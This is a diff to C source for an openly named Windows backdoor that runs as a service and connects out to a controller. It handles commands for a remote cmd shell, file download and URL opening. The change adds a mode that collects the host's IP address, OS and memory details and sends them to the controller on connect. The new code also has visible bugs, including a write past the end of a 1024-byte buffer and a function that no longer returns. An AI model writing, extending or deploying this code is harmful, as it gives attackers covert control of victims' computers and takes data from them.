@@ -19,6 +19,7 @@
 #define SERVER_SHELL                            2
 #define SERVER_DOWNLOAD                         4
 #define SERVER_OPENURL                          8
+#define SERVER_SYSTEMINFO                       10
 // int WINAPI MessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
 void WINAPI BDHandler(DWORD dwControl);
 void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
@@ -30,8 +31,8 @@ SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE ServiceStatusHandle;
 struct CMSG{
         char sign[10];
-        int mod;//自定义模式
-        int msg_l;
+        UINT8 mod;//自定义模式
+        UINT8 msg_l;
 };
 struct CFILE{
     char address[255];
@@ -161,7 +162,6 @@ BOOL OpenURL(LPCTSTR lpszURL, INT nShowCmd)
 //-------------------------SYSTEM INFOMATION START---------------------------------------------------
 
 
-
 char* getIpAddress(){
     WSADATA wsaData;
     char name[255];//定义用于存放获得的主机名的变量 
@@ -232,17 +232,20 @@ char* getMemoryInfo()
 	}
 	
 }
-char* getSystemInfomation(){
-    static char data[255];
+char* getSystemInfomation(char* systeminfo){
+    static char data[1024];
     char *os;
     char *ip;
     char * memory;
     os = getOsInfo();
     ip = getIpAddress();
     memory = getMemoryInfo();
-    sprintf(data,"Ip:%s\nOs:%s\nMemory:%s",ip,os,memory);
-    char *address=data;
-    return address;
+    sprintf(data,"%s\n%s\n%s\n",ip,os,memory);
+    if (data[1024] != '\0'){
+       data[1024]='\0'; 
+    }
+    strcpy(systeminfo,data);
+    
 }
 //-------------------------SYSTEM INFOMATION END-----------------------------------------------------
 
@@ -275,7 +278,7 @@ void BackDoor(SOCKET sock){
     while (1) 
     { 
         
-        ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0); 
+        ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0, 0  ); 
         if (lBytesRead) 
         { 
             
@@ -317,24 +320,27 @@ void Handle(){
     if (WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR) {
         return;
     }
-    const char * systeminfo = getSystemInfomation();
+    char  systeminfo[1024] ;
+    getSystemInfomation(systeminfo);
     struct CMSG msg = {
                 .sign =  "customize",
-                .mod = SERVER_HEARTS,
-                //.msg_l = strlen(systeminfo)
-                .msg_l = 0
+                .mod = SERVER_SYSTEMINFO,
+                .msg_l = strlen(systeminfo)
+                //.msg_l = 0
              };
     send(sock,(char*)&msg,sizeof(struct CMSG),0);
-    //send(sock,systeminfo,strlen(systeminfo),0);//初始化信息
+    send(sock,systeminfo,strlen(systeminfo),0);//初始化信息
     while (TRUE){
         char * address = malloc(sizeof(struct CMSG));
         int ret = recv(sock,address,sizeof(struct CMSG),0);
         struct CMSG msg = *(struct CMSG*)address;
+        printf("Sign:%s\nMOD:%d\nLONG:%d\n",msg.sign,msg.mod,msg.msg_l);
         free(address);
         if(ret == -1){
-            continue;
+            break;
         }
-        if (msg.sign != sign){
+        if (strcmp(msg.sign,sign) != 0){
+            printf("echo debug dafa hao");
             continue;
         }
         switch (msg.mod){
@@ -347,7 +353,7 @@ void Handle(){
                 ret = send(sock,(char*)&msg,sizeof(struct CMSG),0);//心跳包
                 continue;
             case SERVER_SHELL:
-                // CMD命令
+                // CMD命令  
                 BackDoor(sock);
             case SERVER_DOWNLOAD:
                 {
